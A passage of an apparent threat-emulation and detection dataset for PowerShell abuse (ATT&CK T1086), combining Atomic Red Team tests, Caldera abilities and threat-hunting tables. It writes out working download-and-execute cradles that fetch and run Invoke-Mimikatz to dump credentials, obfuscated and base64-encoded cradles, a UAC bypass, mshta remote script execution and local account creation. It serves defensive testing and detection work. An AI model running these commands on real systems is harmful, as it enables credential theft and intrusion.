(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'\n", "New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'\n", "New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'\n", "New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'\n", "powershell.exe IEX -exec bypass -windowstyle hidden -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -windowstyle hidden -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX\"\n", "\"C:\\Windows\\system32\\cmd.exe\" /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()\"\n", "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}, {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}, {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}, {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}, {"windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "payload": "Emulate-Administrator-Tasks.ps1"}}}, {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}, {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}, {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}, "excel.exe", "cmd.exe", "powershell.exe", "excel.exe", "powershell.exe", "mshta.exe", "cmd.exe", "powershell.exe", "mshta.exe", "powershell.exe", "powerpoint.exe", "cmd.exe", "powershell.exe", "powerpoint.exe", "powershell.exe", "powershell.exe webClient.DownloadString(", "powershell.exe webClient.DownloadFile", "powershell.exe webClient.DownloadData", "winword.exe", "powershell.exe", "hidden|-enc|-NonI\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exe", "powershell/lateral_movement/invoke_psremoting", "powershell/lateral_movement/invoke_psremoting", "powershell/management/spawn", "powershell/management/spawn", "python/management/multi/spawn", "python/management/multi/spawn"], "technique_id": "T1086", "parsed_datasets": [{"Atomic Red Team Test - PowerShell": {"display_name": "PowerShell", "atomic_tests": [{"description": "Download Mimikatz and dump credentials\n", "supported_platforms": ["windows"], "name": "Mimikatz", "input_arguments": {"mimurl": {"default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1", "type": "url", "description": "Mimikatz url"}}, "executor": {"elevation_required": true, "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n", "name": "command_prompt"}}, {"description": "Download Bloodhound and run it\n", "supported_platforms": ["windows"], "name": "BloodHound", "input_arguments": {"bloodurl": {"default": "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1", "type": "url", "description": "BloodHound URL"}}, "executor": {"elevation_required": false, "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{bloodurl}'); Invoke-BloodHound\"\n", "name": "command_prompt"}}, {"description": "Different obfuscated methods to test\nReaches out to bit.ly/L3g1t to stdout: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n", "supported_platforms": ["windows"], "name": "Obfuscation Tests", "executor": {"elevation_required": false, "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "name": "powershell"}}, {"description": "Run mimikatz via PsSendKeys\n", "supported_platforms": ["windows"], "name": "Mimikatz - Cradlecraft PsSendKeys", "executor": {"elevation_required": true, "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "name": "powershell"}}, {"description": "Note: Windows 10 only\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n", "supported_platforms": ["windows"], "name": "Invoke-AppPathBypass", "executor": {"elevation_required": false, "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "name": "command_prompt"}}, {"description": "Using PS 5.1, add a user via CLI\n", "supported_platforms": ["windows"], "name": "PowerShell Add User", "input_arguments": {"password": {"default": "ATOM1CR3DT3@M", "type": "string", "description": "password to use"}, "user_name": {"default": "atomic_user", "type": "string", "description": "username to add"}, "description": {"default": "Atomic Things", "type": "string", "description": "Brief description of account"}, "full_name": {"default": "Atomic Red Team", "type": "string", "description": "Full name of user"}}, "executor": {"elevation_required": true, "command": "New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description '#{description}'\n", "name": "powershell"}}, {"description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nPowershell MsXml COM object.\nNot proxy aware removing cache although does not appear to write to those locations\n", "supported_platforms": ["windows"], "name": "Powershell MsXml COM object - no prompt", "input_arguments": {"url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1", "type": "url", "description": "url of payload to execute"}}, "executor": {"elevation_required": false, "command": "powershell.exe IEX -exec bypass -windowstyle hidden -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "name": "command_prompt"}}, {"description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nPowershell MsXml COM object.\nNot proxy aware removing cache although does not appear to write to those locations\n", "supported_platforms": ["windows"], "name": "Powershell MsXml COM object - with prompt", "input_arguments": {"url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1", "type": "url", "description": "url of payload to execute"}}, "executor": {"elevation_required": false, "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "name": "command_prompt"}}, {"description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nPowershell xml download request\n", "supported_platforms": ["windows"], "name": "Powershell XML requests", "input_arguments": {"url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml", "type": "url", "description": "url of payload to execute"}}, "executor": {"elevation_required": false, "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -windowstyle hidden -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n", "name": "command_prompt"}}, {"description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nPowershell invoke mshta to download payload\n", "supported_platforms": ["windows"], "name": "Powershell invoke mshta.exe download", "input_arguments": {"url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct", "type": "url", "description": "url of payload to execute"}}, "executor": {"elevation_required": false, "command": "\"C:\\Windows\\system32\\cmd.exe\" /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n", "name": "powershell"}}, {"description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n", "supported_platforms": ["windows"], "name": "Powershell Invoke-DownloadCradle", "executor": {"steps": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n", "name": "manual"}}, {"description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections.\n", "supported_platforms": ["windows"], "name": "PowerShell Fileless Script Execution", "executor": {"elevation_required": false, "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "name": "powershell", "cleanup_command": "cmd /c del /Q /F %SystemRoot%\\Temp\\art-marker.txt\ncmd /c REG DELETE \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /f\n"}}, {"description": "Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n", "dependencies": [{"description": "PowerShell version 2 must be installed\n", "get_prereq_command": "Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually\n", "prereq_command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "PowerShell Downgrade Attack", "executor": {"elevation_required": false, "command": "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "name": "powershell"}}, {"dependencies": [{"description": "Homedrive must be an NTFS drive\n", "get_prereq_command": "Write-Host Prereq's for this test cannot be met automatically\n", "prereq_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "NTFS Alternate Data Stream Access", "executor": {"elevation_required": false, "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "name": "powershell", "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n"}, "input_arguments": {"ads_file": {"default": "$env:TEMP\\NTFS_ADS.txt", "type": "String", "description": "File created to store Alternate Stream Data"}}, "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file\n"}], "attack_technique": "T1086"}}, {"Mitre Stockpile - Capture running processes via PowerShell": {"platforms": {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "description": "Capture running processes via PowerShell", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell Collection"}, "id": "4d9b079c-9ede-4116-8b14-72ad3a5533af", "name": "PowerShell Process Enumeration"}}, {"Mitre Stockpile - User enumeration": {"platforms": {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}, "name": "cmd.exe information gathering", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "55678719-e76e-4df9-92aa-10655bbd1cf4", "description": "User enumeration"}}, {"Mitre Stockpile - System Information Gathering Script": {"platforms": {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}, "name": "PowerShell information gathering", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2", "description": "System Information Gathering Script"}}, {"Mitre Stockpile - Determine whether or not UAC is enabled": {"platforms": {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}, "description": "Determine whether or not UAC is enabled", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell Collection"}, "id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4", "name": "UAC Status"}}, {"Mitre Stockpile - Copy powershell to non-standard location and perform triage commands": {"platforms": {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}, "description": "Copy powershell to non-standard location and perform triage commands", "tactic": "defense-evasion", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d", "name": "Move Powershell & triage"}}, {"Mitre Stockpile - Emulate administrator tasks on a system in a separate process": {"platforms": {"windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "payload": "Emulate-Administrator-Tasks.ps1"}}}, "description": "Emulate administrator tasks on a system in a separate process", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "315cedf1-4a3a-4015-b63f-149d64bacbbc", "name": "Emulate Administrator Tasks"}}, {"Mitre Stockpile - Download": {"platforms": {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}, "description": "Download", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "bfff9006-d1fb-46ce-b173-92cb04e9a031", "name": "PowerShell bitly Link Download"}}, {"Mitre Stockpile - Download": {"platforms": {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}, "description": "Download", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "ccdb8caf-c69e-424b-b930-551969450c57", "name": "PowerShell Invoke MimiKats"}}, {"Mitre Stockpile - Download and install PSTools by unzipping the file": {"platforms": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}, "description": "Download and install PSTools by unzipping the file", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "id": "eb814e03-811a-467a-bc6d-dcd453750fa2", "name": "Install PSTools"}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100025", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe"}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100029", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "powershell.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "mshta.exe", "itw_sample": "3560481cc51a08c94cd5649b2782ec1395d56d9a1721e6e03720420898772ed0", "chain_id": "100042", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe"}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "mshta.exe", "itw_sample": "ee29b9c01318a1e23836b949942db14d4811246fdae2f41df9f0dcd922c63bc6", "chain_id": "100045", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "powershell.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100056", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe"}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100060", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "powershell.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "powershell.exe", "itw_sample": "", "chain_id": "100064", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "low", "commandline_string": "webClient.DownloadString(", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "powershell.exe", "itw_sample": "", "chain_id": "100065", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "low", "commandline_string": "webClient.DownloadFile", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "powershell.exe", "itw_sample": "https://www.joesandbox.com/analysis/35219/0/html", "chain_id": "100066", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "low", "commandline_string": "webClient.DownloadData", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1086", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100092", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "powershell.exe", "sub_process_2": ""}}, {"SysmonHunter - T1086": {"phase": "Execution", "query": [{"process": 